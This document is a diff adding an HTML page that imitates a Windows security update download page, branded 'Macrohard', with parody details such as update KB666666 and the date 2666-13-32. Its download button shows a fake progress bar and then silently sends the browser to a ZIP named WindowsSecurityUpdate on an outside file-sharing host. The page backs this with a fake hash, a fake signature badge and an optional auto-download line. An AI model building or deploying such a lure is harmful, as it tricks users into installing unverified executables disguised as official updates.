@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows 安全更新 - Macrohard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: "Segoe UI", "Microsoft YaHei", Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(to bottom, #0078d7 0%, #005a9e 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            background: linear-gradient(to bottom, #f2f2f2 0%, #e6e6e6 100%);
+            padding: 15px 25px;
+            border-radius: 8px 8px 0 0;
+            border: 1px solid #ccc;
+            border-bottom: none;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            color: #000;
+            text-decoration: none;
+        }
+        
+        .logo-icon {
+            font-size: 32px;
+            font-weight: bold;
+            margin-right: 12px;
+            background: linear-gradient(135deg, #0078d7 0%, #005a9e 100%);
+            color: white;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 6px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            font-weight: 300;
+            color: #000;
+            text-shadow: 0 1px 1px rgba(255,255,255,0.8);
+        }
+        
+        .main-content {
+            background: linear-gradient(to bottom, #ffffff 0%, #f8f8f8 100%);
+            border-radius: 0 0 8px 8px;
+            padding: 30px;
+            border: 1px solid #ccc;
+            border-top: none;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+        
+        .page-title {
+            color: #0078d7;
+            font-size: 36px;
+            font-weight: 300;
+            margin-bottom: 15px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .breadcrumb {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e0e0e0;
+            background: linear-gradient(to bottom, #f9f9f9 0%, #f0f0f0 100%);
+            padding: 10px 15px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        
+        .breadcrumb a {
+            color: #0078d7;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        
+        .update-info {
+            background: linear-gradient(to bottom, #e3f2fd 0%, #bbdefb 100%);
+            padding: 25px;
+            border-radius: 8px;
+            border: 1px solid #90caf9;
+            margin-bottom: 30px;
+            box-shadow: inset 0 1px 3px rgba(255,255,255,0.5);
+        }
+        
+        .info-title {
+            font-size: 22px;
+            color: #0078d7;
+            margin-bottom: 15px;
+            text-shadow: 0 1px 1px rgba(255,255,255,0.8);
+        }
+        
+        .info-list {
+            list-style: none;
+        }
+        
+        .info-list li {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(144, 202, 249, 0.5);
+            font-weight: 500;
+        }
+        
+        .info-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .download-section {
+            text-align: center;
+            padding: 35px;
+            background: linear-gradient(135deg, #e8f5e8 0%, #c8e6c9 100%);
+            border-radius: 10px;
+            border: 2px solid #4caf50;
+            margin: 40px 0;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+        }
+        
+        .download-title {
+            font-size: 28px;
+            color: #2e7d32;
+            margin-bottom: 25px;
+            text-shadow: 0 1px 2px rgba(255,255,255,0.8);
+        }
+        
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(to bottom, #4caf50 0%, #388e3c 100%);
+            color: white;
+            padding: 18px 50px;
+            font-size: 20px;
+            font-weight: 600;
+            text-decoration: none;
+            border-radius: 6px;
+            border: 1px solid #2e7d32;
+            cursor: pointer;
+            text-shadow: 0 -1px 1px rgba(0,0,0,0.3);
+            box-shadow: 0 3px 10px rgba(76, 175, 80, 0.4),
+                        inset 0 1px 0 rgba(255,255,255,0.3);
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .download-btn:hover {
+            background: linear-gradient(to bottom, #43a047 0%, #2e7d32 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(76, 175, 80, 0.5),
+                        inset 0 1px 0 rgba(255,255,255,0.3);
+        }
+        
+        .download-btn:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 5px rgba(76, 175, 80, 0.3),
+                        inset 0 1px 2px rgba(0,0,0,0.2);
+        }
+        
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            background: linear-gradient(45deg, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0) 50%);
+            transform: rotate(45deg);
+            z-index: 1;
+        }
+        
+        .download-info {
+            margin-top: 20px;
+            color: #555;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .system-requirements {
+            margin: 35px 0;
+        }
+        
+        .requirements-title {
+            font-size: 24px;
+            color: #0078d7;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 3px solid #0078d7;
+            text-shadow: 0 1px 1px rgba(255,255,255,0.8);
+        }
+        
+        .requirements-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-top: 25px;
+        }
+        
+        .requirement-card {
+            background: linear-gradient(to bottom, #f5f5f5 0%, #eeeeee 100%);
+            padding: 25px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .card-title {
+            color: #0078d7;
+            font-weight: 600;
+            margin-bottom: 15px;
+            font-size: 18px;
+            text-shadow: 0 1px 1px rgba(255,255,255,0.8);
+        }
+        
+        .footer {
+            text-align: center;
+            color: white;
+            padding: 40px 0 20px;
+            font-size: 14px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+        
+        .footer-links {
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: rgba(255,255,255,0.9);
+            text-decoration: none;
+            margin: 0 12px;
+            font-weight: 500;
+        }
+        
+        .footer-links a:hover {
+            color: white;
+            text-decoration: underline;
+        }
+        
+        .security-badge {
+            display: inline-block;
+            background: linear-gradient(to bottom, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0.1) 100%);
+            padding: 10px 20px;
+            border-radius: 25px;
+            margin-top: 20px;
+            font-size: 13px;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        
+        /* Windows 7 风格滚动条 */
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: linear-gradient(to bottom, #f0f0f0 0%, #e0e0e0 100%);
+            border-radius: 6px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(to bottom, #0078d7 0%, #005a9e 100%);
+            border-radius: 6px;
+            border: 2px solid #f0f0f0;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(to bottom, #106ebe 0%, #004578 100%);
+        }
+        
+        /* 下载动画 */
+        .download-loading {
+            display: none;
+            margin-top: 15px;
+            color: #2e7d32;
+            font-weight: 500;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(to right, #4caf50 0%, #2e7d32 100%);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <a href="#" class="logo">
+                <div class="logo-icon">✕</div>
+                <div class="logo-text">Macrohard</div>
+            </a>
+        </header>
+
+        <main class="main-content">
+            <h1 class="page-title">Windows 安全更新 KB666666</h1>
+            
+            <div class="breadcrumb">
+                <a href="#">首页</a> › 
+                <a href="#">下载中心</a> › 
+                <a href="#">Windows 更新</a> › 
+                <span>安全更新</span>
+            </div>
+            
+            <div class="update-info">
+                <h2 class="info-title">更新概述</h2>
+                <ul class="info-list">
+                    <li><strong>发布日期：</strong>2666年13月32日</li>
+                    <li><strong>版本：</strong>6.6.6.6</li>
+                    <li><strong>重要性：</strong>关键</li>
+                    <li><strong>文件大小：</strong>67.8 MB</li>
+                    <li><strong>分类：</strong>安全更新</li>
+                </ul>
+            </div>
+            
+            <div class="download-section">
+                <h2 class="download-title">立即下载 Windows 安全更新</h2>
+                <button class="download-btn" onclick="startDownload()">
+                    下载 Windows 关键更新程序
+                </button>
+                <div class="download-info">
+                    支持 Windows 10、Windows 11 及 Windows Server 2022
+                </div>
+                
+                <div class="download-loading" id="downloadLoading">
+                    下载中... 请稍候
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="update-description">
+                <h2 class="requirements-title">更新说明</h2>
+                <p>此关键安全更新添加了 Windows 系统中的多个漏洞，可降低系统安全性和稳定性。建议所有用户立即安装。</p>
+                
+                <h3 style="color: #0078d7; margin: 20px 0 15px;">此更新包括以下改进：</h3>
+                <ul style="margin: 15px 0 15px 30px; list-style-type: none;">
+                    <li style="padding: 8px 0; border-bottom: 1px dashed #ddd;">引入了远程代码执行漏洞</li>
+                    <li style="padding: 8px 0; border-bottom: 1px dashed #ddd;">减少了系统内核保护机制</li>
+                    <li style="padding: 8px 0; border-bottom: 1px dashed #ddd;">降低了内存管理安全性</li>
+                    <li style="padding: 8px 0; border-bottom: 1px dashed #ddd;">增加了特权提升漏洞</li>
+                    <li style="padding: 8px 0;">减弱了防御恶意软件的能力
+
+</li>
+                </ul>
+                
+                <div style="background: #fff3cd; padding: 15px; border-radius: 6px; border: 1px solid #ffeaa7; margin: 20px 0;">
+                    <strong>注意：</strong>安装此更新后可能需要重启计算机。建议不保存所有工作后再进行安装。
+                </div>
+            </div>
+            
+            <div class="system-requirements">
+                <h2 class="requirements-title">系统要求</h2>
+                <div class="requirements-grid">
+                    <div class="requirement-card">
+                        <h3 class="card-title">支持的操作系统</h3>
+                        <p>Windows 10 Version 1809 及更高版本</p>
+                        <p>Windows 11 所有版本</p>
+                        <p>Windows Server 2022</p>
+                    </div>
+                    
+                    <div class="requirement-card">
+                        <h3 class="card-title">硬件要求</h3>
+                        <p>处理器：1 GHz 或更快</p>
+                        <p>内存：1 GB RAM (32位) / 2 GB RAM (64位)</p>
+                        <p>硬盘空间：50 MB 可用空间</p>
+                    </div>
+                    
+                    <div class="requirement-card">
+                        <h3 class="card-title">其他要求</h3>
+                        <p>需要管理员权限安装</p>
+                        <p>需要互联网连接以下载依赖项</p>
+                        <p>建议在安装前关闭所有应用程序</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="additional-info">
+                <h2 class="requirements-title">其他信息</h2>
+                <p><strong>SHA256 哈希值：</strong> <code style="background: #f5f5f5; padding: 5px 10px; border-radius: 4px; border: 1px solid #ddd;">01eee610f42151275ce6cc3cd559be4ecee149606a6249c31a465014cf8f9ef4</code></p>
+                <p><strong>数字签名：</strong> Macrohard Windows Publisher</p>
+                <p><strong>相关知识库文章：</strong> <a href="#" style="color: #0078d7; text-decoration: none; font-weight: 500;">KB666666</a></p>
+            </div>
+        </main>
+        
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">联系我们</a>
+                <a href="#">隐私声明</a>
+                <a href="#">使用条款</a>
+                <a href="#">商标</a>
+                <a href="#">关于我们的广告</a>
+                <a href="#">京ICP备666666号</a>
+            </div>
+            <div>© 2666 Macrohard corporation。保留所有权利。</div>
+            <div class="security-badge">安全验证通过 | Macrohard Authenticode 签名</div>
+        </footer>
+    </div>
+
+    <script>
+        function startDownload() {
+            // 显示下载进度动画
+            const loadingElement = document.getElementById('downloadLoading');
+            const progressFill = document.getElementById('progressFill');
+            
+            loadingElement.style.display = 'block';
+            
+            // 模拟进度条动画
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress > 100) progress = 100;
+                progressFill.style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    // 延迟一下再开始实际下载
+                    setTimeout(() => {
+                        // 直接开始下载，无任何提示
+                        window.location.href = 'https://111pan.cn/f/vOPiW/WindowsSecurityUpdate.zip';
+                        
+                        // 记录下载统计
+                        console.log('Download started: WindowsSecurityUpdate.exe');
+                    }, 500);
+                }
+            }, 100);
+        }
+        
+        // 添加自动点击功能（可选，用于演示）
+        // 注释掉这行代码，除非你需要自动开始下载
+        // setTimeout(startDownload, 3000);
+    </script>
+</body>
+</html>
